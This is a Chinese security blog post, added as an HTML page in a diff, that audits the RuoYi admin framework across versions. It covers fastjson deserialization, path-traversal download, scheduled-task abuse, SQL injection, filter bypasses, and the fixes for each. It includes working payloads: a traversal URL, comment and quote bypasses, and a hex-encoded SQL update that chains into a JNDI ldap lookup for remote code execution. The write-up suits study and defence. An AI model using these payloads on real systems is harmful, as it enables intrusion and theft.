@@ -1,0 +1,1033 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            若依各版本漏洞 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        若依各版本漏洞
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv3</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-08-02 21:39:53</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Sat Aug 02 2025 21:49:46 GMT+0800">2025-08-02 21:49:46</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>5.1k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>21 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id=""><a href="#" class="headerlink" title="&lt;&#x3D;4.2.0-Fastjson"></a>&lt;&#x3D;4.2.0-Fastjson</h1><p>这个搞了半天，最终还是没发现能够直接利用的方法，都需要手动开启autotype才行，网上好多文章都没提，挺坑的。另外，甚至连dns探测都用不了，因为键值对是通过hashmap.put的，顺序会乱。</p>
+<p>这里的fastjson版本为1.2.60</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>直接ctrl+shift+f，搜索parseObject，搜索结果比较少，能一个个看：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142290879.png"  alt="img"></p>
+<p>这里经过排查，com.ruoyi.generator.service.impl.GenTableServiceImpl#validateEdit里的是最好利用的。首先，上一个调用它的直接就是一个路由，意味着调试路径短。其次，路由传入的直接就是genTable，而genTable就是最后json字符串的来源，即我们可以直接控制json字符。</p>
+<p>下面看一下两个部分的代码：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image.png"  alt="img"></p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image.png"  alt="img"></p>
+<p>editSave中的genTableService是确定的，因为这个接口只有一个实现类且通过Autowired注解注入。</p>
+<p>看下面图片的代码，能发现，我们需要进入if才能触发parseObject。怎么进入呢，这里不妨先发几个包测试一下。路由是&#x2F;tool&#x2F;gen&#x2F;edit，根据含义比较容易找到：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image.png"  alt="img"></p>
+<p>对编辑后的结果保存，抓包：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142290870.png"  alt="img"></p>
+<p>能够找到和进入if相关的字段，我们改成tree就可以了。下面那三个参数就决定了json数据，待会儿看。</p>
+<p>当然ruoyi前端也可以直接改：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142297412.png"  alt="img"></p>
+<p>改完会字段信息那儿再提交就行。</p>
+<p>提交数据包，跟进调试：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142297434.png"  alt="img"></p>
+<p>这三个参数不就是上面数据包的最后一行吗，所以漏洞点就在这里。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>复现的过程中产生了几个问题：</p>
+<ul>
+<li>autotype不开有什么影响</li>
+<li>@type不在最前面有关系吗</li>
+<li>json里键值对的顺序怎么决定</li>
+</ul>
+<p>下面会一一解释</p>
+<p>1、dns探测</p>
+<p>这里用java.net.Inet4Address，java.net.URL在1.2.43被ban了。<img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142297445.png"  alt="img"></p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142297437.png"  alt="img"></p>
+<p>但是这里有个问题：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142297439.png"  alt="img"></p>
+<p>处理成json后，val会在前面，这样就打不通了。</p>
+<p>那为什么会是这样的顺序？我们看一下这个json怎么来的：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142297454.png"  alt="img"></p>
+<p>是通过getParams来的。</p>
+<p>Params怎么赋值：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142306929.png"  alt="img"></p>
+<p>params是个普通的HashMap，在我们发起请求时会自动通过hashMap.put赋值，这里面的顺序就是根据hash值排序了，所以我们没法直接控制。LinkedHashMap的话，顺序就可以控制了。</p>
+<p>解决完json顺序的问题，再看看为什么val在前就不行。</p>
+<p>当val在前时，val先会被当成普通数据处理，然后再处理@type，但是这样@type就没有参数了，所以会调用newInstance新建实例，可是Inet4Address没有public的无参构造，所以会报错，在这里抛出：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142306943.png"  alt="img"></p>
+<p>这里强烈建议跟一遍调试，把json字符串到底是怎么处理的过一遍，在这里断点：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142306979.png"  alt="img"></p>
+<p>把lexer的ch添加到监视，lexer是一个字符扫描器，负责识别json，ch是目前识别的字符：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142306990.png"  alt="img"></p>
+<p>网上查了好久，不如自己跟一遍调试快，有不懂的代码或逻辑问ai就行。</p>
+<p>综上，由于我们无法决定键值对顺序，而且val在前也不行，所以没法打dns。</p>
+<p>另外，值得一提的是，Inet4Address在不开启autotype的情况下也是能打的，可以走这里进行类加载：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142306993.png"  alt="img"></p>
+<p>这个在后面的版本好像修复了，是1.2.68吗，不能确定。</p>
+<p>2、jndi</p>
+<p>这里有shiro，可以用shiro里的一个类打jndi</p>
+<p>{&quot;@type&quot;: &quot;org.apache.shiro.jndi.JndiObjectFactory&quot;, &quot;resourceName&quot;: &quot;ldap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;8e9b69&quot;}</p>
+<p>但是由于默认不开启autotype，是打不通的。</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142316147.png"  alt="img"></p>
+<p>autotype一关，@type就基本没用了（上面那种Inet4的例外）。</p>
+<p>这个类在1.2.68才ban，所以这里只是单纯没法加载才抛出：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142316149.png"  alt="img"></p>
+<p>3、其他</p>
+<p>由于只能控制键值对内容，故只能使用单层的payload，大括号套大括号是用不了的。</p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>更新fastjson</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这个几乎花了一天，对fastjson还是不熟悉。这个漏洞其实限制很多，目前还不知道怎么利用。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>主要是fastjson相关的</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist" >https://github.com/LeadroyaL/fastjson-blacklist<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty" >https://github.com/lemono0/FastJsonParty<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="-1"><a href="#-1" class="headerlink" title="&lt;&#x3D;4.5.0-任意文件下载"></a>&lt;&#x3D;4.5.0-任意文件下载</h1><p>这个比较简单：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142326698.png"  alt="img"></p>
+<p>&#x2F;common&#x2F;download&#x2F;resource?resource&#x3D;&#x2F;profile&#x2F;..&#x2F;..&#x2F;flag.txt</p>
+<p>为什么要加&#x2F;profile，自己调试一下就懂了。</p>
+<p>之后多注意writeBytes方法，可能会有文件下载的相关漏洞。</p>
+<h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><p>加了一个方法：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142326655.png"  alt="img"></p>
+<p>对目录穿越和文件后缀都做了限制。</p>
+<h1 id="-2"><a href="#-2" class="headerlink" title="&lt;&#x3D;4.7.8-定时任务&amp;任意文件下载"></a>&lt;&#x3D;4.7.8-定时任务&amp;任意文件下载</h1><h2 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>前面为了防止目录穿越，作者增加了一个方法来过滤..&#x2F;，这样我们就没办法下载规定目录外的文件。然而，在我们刚开始使用&#x2F;common&#x2F;download&#x2F;resource路由时，很可能直接这样写参数?resource&#x3D;..&#x2F;..&#x2F;flag.txt，然后发现并没有成功下载。调试时一看，发现我们的目录根本没被拼接，只有配置文件里Profile的路径。</p>
+<p>那么，如果我们能修改Profile的路径，是不是就能直接指定文件位置，从而绕过过滤了呢？</p>
+<p>首先我们看一下Profile是怎么从配置文件到类里的。</p>
+<p>我们可以找到一个RouYiConfig类，这个类通过注解与配置文件关联，并且有Component注解，因此它是一个bean，同时我们的profile也在里面：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142326675.png"  alt="img"></p>
+<p>并且，这里还提供了一个方法供你修改profile：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142326727.png"  alt="img"></p>
+<p>所以，现在的目标就是调用setProfile来修改文件下载位置。</p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在&lt;&#x3D;4.7.6时，利用会简单一点</p>
+<p>要怎么实现呢，靠定时任务。很多管理后台都会提供定时任务的功能，但是往往欠缺防护，会导致执行一些恶意任务。</p>
+<p>看一下RuoYI的定时任务要怎么执行：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142333934.png"  alt="img"></p>
+<p>这里的cron表达式代表每5分钟执行一次，cron表达式可以去网上自己看一下。</p>
+<p>关键就在这里的调用目标字符串。我们先尝试直接用全限定名加方法的形式调用，发现会报错，说有违规字符串。调试一下发现，不允许出现com.ruoyi.common.config。看来作者是考虑到这点的：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142333851.png"  alt="img"></p>
+<p>但是，我们通过bean方式调用就可以：ruoYIConfig.setProfile(“D:&#x2F;test.txt”)</p>
+<p>在最后一个白名单判断if中，只要bean是在com.ruoyi包中就都可以：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142333857.png"  alt="img"></p>
+<p>因此我们的ruoYIConfig.setProfile(“D:&#x2F;test.txt”)也可以。</p>
+<p>设定好后，在任务状态处打开任务，然后再去&#x2F;common&#x2F;download&#x2F;resource?resource&#x3D;any.txt下请求，就能下载我们在profile中设置的文件了。</p>
+<p>在&lt;&#x3D;4.7.8时，我们不能直接创建修改Config的定时任务了，但是可以通过sql注入来修改已经创建的合法任务，利用过程差不多，就是加了一个sql注入的过程</p>
+<h2 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h2><p>加载bean的时候，使用黑白名单。刚刚是只用了白名单com.ruoyi，现在把全限定名调用里的黑名单也加上了：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142333902.png"  alt="img"></p>
+<h1 id="-3"><a href="#-3" class="headerlink" title="&lt;&#x3D;4.6.1-SQL注入"></a>&lt;&#x3D;4.6.1-SQL注入</h1><h2 id="漏洞发现-2"><a href="#漏洞发现-2" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>ctrl+shift+f 搜索字符 ${ ：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142341672.png"  alt="img"></p>
+<p>发现Mapper.xml中存在使用$ 来注入参数，可能存在拼接问题。</p>
+<p>挑选一个审计：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142341706.png"  alt="img"></p>
+<p>解释一下，${params.dataScope}指的是，传入的参数中有一个字段名为params，这个字段可能是HashMap这种键值对，所以可以通过params.dataScope选择具体键值对。</p>
+<p>往前找对应的mapper接口：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142341748.png"  alt="img"></p>
+<p>然后找对应的实现：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142341702.png"  alt="img"></p>
+<p>最终找到路由处的用法：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142341676.png"  alt="img"></p>
+<p>这里对应的父路由是&#x2F;system&#x2F;dept：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142359900.png"  alt="img"></p>
+<p>&#x2F;list对应的功能，应该就是列出列表，尝试查询：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142359862.png"  alt="img"></p>
+<p>这样就找到漏洞点了。</p>
+<h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以使用的字段有com.ruoyi.common.core.domain.entity.SysDept和它的父类com.ruoyi.common.core.domain.BaseEntity</p>
+<p>而params就在父类中，是一个hashmap，所以可以这样传参：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142359898.png"  alt="img"></p>
+<p>能实现报错注入。</p>
+<p>其他的注入点也有，这里列举一些，寻找方式同上：</p>
+<p>&#x2F;system&#x2F;role&#x2F;list</p>
+<p>&#x2F;system&#x2F;role&#x2F;export</p>
+<p>&#x2F;system&#x2F;user&#x2F;list</p>
+<p>&#x2F;system&#x2F;user&#x2F;export</p>
+<p>&#x2F;system&#x2F;role&#x2F;authUser&#x2F;allocatedList</p>
+<p>&#x2F;system&#x2F;role&#x2F;authUser&#x2F;unallocatedList</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>commit编号e1cab589f2acf4e835ad5ab310bdbe71f2dd646d，通过织入点的方式，对所有有datascope注解的方法都进行了过滤，因此params相关的注入被修复。</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142359929.png"  alt="img"></p>
+<h1 id="4-7-1-4-7-8-SQL注入-绕过"><a href="#4-7-1-4-7-8-SQL注入-绕过" class="headerlink" title="4.7.1-4.7.8-SQL注入+绕过"></a>4.7.1-4.7.8-SQL注入+绕过</h1><h2 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>4.7.1版本开始，增加了一个创建表的功能，可以从这里注入。</p>
+<p>路由在&#x2F;tool&#x2F;gen&#x2F;createTable</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142372118.png"  alt="img"></p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142372075.png"  alt="img"></p>
+<p>这里运行执行一个create操作，并且会直接执行。</p>
+<p>所以可以通过create fake_table as select extractvalue(1,database())的方法进行报错注入</p>
+<p>在后面的版本，增加了过滤功能：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142372078.png"  alt="img"></p>
+<p>会对常见注入关键字进行过滤。不过StringUtils.indexOfIgnoreCase的匹配原理是，先将value按空格split，再去和keyword一一匹配。所以可以通过select&#x2F;**&#x2F;extractvalue的方式绕过，因为这样select和后面的就成为一个整体了。</p>
+<h2 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h2><p>4.7.6版本开始，不会回显具体报错：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142372098.png"  alt="img"></p>
+<p>但是到4.7.9版本，还是可以使用时间注入。</p>
+<p>4.8.0版本，黑名单更加全面：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142372126.png"  alt="img"></p>
+<h1 id="-4"><a href="#-4" class="headerlink" title="&lt;&#x3D;4.7.8-定时任务SQL&amp;RCE"></a>&lt;&#x3D;4.7.8-定时任务SQL&amp;RCE</h1><h2 id="漏洞发现-3"><a href="#漏洞发现-3" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>前面学习了若依的SQL注入，但除了从Controller注入，还有一种另外的方式，那就是直接调用Service层的方法。因为所有过滤操作都是在Controller层实现的，所以一旦能直接操纵Service层的方法，那所有过滤操作就形同虚设了，只要Mapper.xml中还是使用${}，那我们就可以尝试注入。</p>
+<p>正好，若依里给我们提供了定时任务的功能，而且正好没有将sql操作相关的Service类列入黑名单，所以可以直接操作Service方法进行注入，如下图：<img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142381083.png"  alt="img"></p>
+<p>这个方法在上面sql注入绕过中也出现过。</p>
+<p>定时任务在设定时，对一些关键词是有过滤的，比如不允许出现ldap，ldaps，rmi等：<img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142381106.png"  alt="img"></p>
+<p>但是有了sql注入，我们就可以先设置合法任务，再修改成非法任务。</p>
+<h2 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1、任意创建一个定时任务</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142381099.png"  alt="img"></p>
+<p>2、创建第二个任务，用于修改第一个任务，由于创建任务调用的目标字符串不允许出现ldap，所以在sql注入时要16进制编码绕过：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genTableServiceImpl.createTable(&quot;update sys_job set invoke_target=0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a35303338392f6337386433332729 where job_id=100&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>javax.naming.InitialContext.lookup(‘ldap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;c78d33’)</p>
+<p>另外，在创建任务时，还有一种绕过方法，就是在所有协议中间加一个单引号。ld’ap，ht’tp，这样就行。</p>
+<p>3、运行一下创建的sql注入任务：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142381093.png"  alt="img"></p>
+<p>然后就能发现创建的第一个任务的内容发生变化，变成了ldap任务，执行后即可触发jndi。</p>
+<h2 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h2><p>这里讲一下定时任务修复的发展史</p>
+<p>1、4.7.0之前的版本，只对rmi协议进行了黑名单。下面是4.6.2</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142467387.png"  alt="img"></p>
+<p>2、4.7.0对http，https，ldap，ldaps进行了黑名单：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142467390.png"  alt="img"></p>
+<p>3、4.7.1对一些恶意类进行了黑名单：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142467401.png"  alt="img"></p>
+<p>4、4.7.6开始？不确定，增加了黑白名单，先黑名单，再白名单，白名单为com.ruoyi</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142467407.png"  alt="img"></p>
+<p>5、4.7.9开始，进一步完善黑名单和白名单：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142467417.png"  alt="img"></p>
+<p>这样sql+RCE的方法就用不了了</p>
+<p>但是注意，这里的白名单匹配是包含即可，而不是严格要求匹配，这也为4.8.0的绕过做下铺垫。</p>
